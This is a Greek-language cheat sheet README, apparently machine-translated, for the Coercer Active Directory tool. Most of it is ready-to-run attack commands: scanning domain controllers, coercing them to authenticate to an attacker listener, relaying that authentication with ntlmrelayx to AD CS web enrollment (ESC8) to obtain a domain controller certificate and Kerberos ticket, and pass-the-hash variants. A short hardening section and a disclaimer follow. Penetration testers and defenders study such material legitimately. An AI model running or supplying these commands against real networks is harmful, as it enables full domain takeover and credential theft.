<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 Coercer - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</p>

<p align="center">
  <b>🌐 Αυτόματη σάρωση, εντοπισμός και εξαναγκασμός διακομιστών Windows και ελεγκτών τομέα σε έλεγχο ταυτότητας πίσω σε αυθαίρετα μηχανήματα μέσω 12+ πρωτοκόλλων RPC</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Overview & The Authentication Coercion Primitive](#-overview--the-authentication-coercion-primitive)
- [Υποστηριζόμενα Πρωτόκολλα & Μέθοδοι RPC](#-supported-rpc-protocols--methods)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Scanning for Vulnerable RPC Interfaces (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Εκτέλεση εξαναγκασμού ελέγχου ταυτότητας (`coerce`)](#-executing-authentication-coercion-coerce)
- [The Full Attack Chain: Coercion -> NTLM Relay -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [Φιλτράρισμα πρωτοκόλλου και μεθόδου](#-πρωτόκολλο--μέθοδος-φίλτρο)
- [Υποστήριξη Kerberos & Pass-the-Hash](#-kerberos--pass-the-hash-support)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & The Authentication Coercion Primitive

Σε περιβάλλοντα Active Directory, ο **καταναγκασμός ελέγχου ταυτότητας** είναι ένα καταστροφικό προσβλητικό πρωτόγονο. Εκμεταλλεύεται παλαιού τύπου διεπαφές RPC που υλοποιούνται σε υπηρεσίες Windows που επιτρέπουν σε έναν πιστοποιημένο χρήστη να ζητήσει από ένα απομακρυσμένο μηχάνημα (όπως έναν ελεγκτή τομέα) να συνδεθεί σε μια καθορισμένη διαδρομή UNC (`\\attacker\share`).

Όταν το απομακρυσμένο μηχάνημα Windows συνδέεται με το μηχάνημα που ελέγχεται από τον εισβολέα, εκκινεί **τον έλεγχο ταυτότητας NTLM λογαριασμού μηχανήματος** (`DC01$`). 

Καταγράφοντας ή αναμεταδίδοντας αυτό το διαπιστευτήριο λογαριασμού μηχανήματος χρησιμοποιώντας το `ntlmrelayx` στις υπηρεσίες πιστοποιητικών Active Directory (AD CS Web Enrollment - ESC8) ή μη περιορισμένους στόχους ανάθεσης, οι εισβολείς μπορούν να επιτύχουν **άμεσο πλήρη συμβιβασμό τομέα**.

Συντάκτης του **Clément Notin (p0dalirius)**, το **Coercer** ενοποιεί πάνω από δώδεκα μεμονωμένα εκμεταλλεύσεις εξαναγκασμού (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) σε ένα ενιαίο, αυτοματοποιημένο, εξαιρετικά αρθρωτό πλαίσιο.

---

## 🔌 Υποστηριζόμενα Πρωτόκολλα & Μέθοδοι RPC

Το Coercer δοκιμάζει και εκμεταλλεύεται τις ακόλουθες διεπαφές RPC:

| Όνομα πρωτοκόλλου | Common Exploit Name | Σωλήνας / Διεπαφή |
|---------------|---------------------|------------------|
| **MS-EFSRPC** | PetitPotam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug / SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | ShadowCoerce | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoerce | `\pipe\netdfs` |
| **MS-PAN** | Εκτύπωση Εφιάλτης δίπλα | Διαχείριση απομακρυσμένης εκτύπωσης |
| **MS-SAMR** | Τυρίωμα | Διαχείριση λογαριασμού ασφαλείας |

---

## 📥 Εγκατάσταση
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 Σάρωση για ευάλωτες διεπαφές RPC (`scan`)

Πριν ενεργοποιήσετε τον εξαναγκασμό, σαρώστε με ασφάλεια τους ελεγκτές τομέα στόχων για να ανακαλύψετε ποιες λειτουργίες RPC είναι ενεργοποιημένες και προσβάσιμες:
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ Εκτέλεση εξαναγκασμού ελέγχου ταυτότητας (`coerce`)

Ενεργοποιήστε μια εξερχόμενη σύνδεση NTLM μηχανής-λογαριασμού από το DC-στόχο στον ακροατή σας:
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 Η πλήρης αλυσίδα επίθεσης: εξαναγκασμός -> ρελέ NTLM -> AD CS ESC8

Το κανονικό διάνυσμα κλιμάκωσης τομέα:
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 Φιλτράρισμα πρωτοκόλλου και μεθόδου

Στοχεύστε μια συγκεκριμένη μέθοδο χωρίς αποστολή ανεπιθύμητης αλληλογραφίας σε ολόκληρο το φάσμα RPC:
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Υποστήριξη Kerberos & Pass-the-Hash
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Σάρωση DC για εξαναγκασμό** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Αναγκαστικός έλεγχος ταυτότητας** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Καταναγκασμός μέσω MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Καταναγκασμός μέσω MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Αναγκασμός Pass-the-Hash** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Κερμπέρος Εισιτήριο Καταναγκασμός** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Σκλήρυνση

1. **Απενεργοποίηση ουράς εκτύπωσης σε DC:** Η υπηρεσία Print Spooler (`spoolsv.exe`) θα πρέπει να είναι εντελώς απενεργοποιημένη στους ελεγκτές τομέα (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **Ενεργοποίηση εκτεταμένης προστασίας για έλεγχο ταυτότητας (EPA):** Σε διακομιστές AD CS IIS, ενεργοποιήστε την EPA και απαιτήστε από το HTTPS να αποκλείει επιθέσεις αναμετάδοσης NTLM.
3. **Φιλτράρισμα RPC & Τμηματοποίηση Δικτύου:** Περιορίστε την πρόσβαση αντιστοίχισης τελικού σημείου RPC (θύρα TCP 135) σε εξουσιοδοτημένα υποδίκτυα διαχείρισης.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το Coercer ενεργοποιεί ενεργές κλήσεις απομακρυσμένου ελέγχου ταυτότητας που μπορούν να αποσταθεροποιήσουν τις υπηρεσίες τομέα που δεν έχουν επιδιορθωθεί. Χρησιμοποιήστε αποκλειστικά κατά τη διάρκεια εξουσιοδοτημένων δοκιμών διείσδυσης και με τη ρητή συγκατάθεση του πελάτη.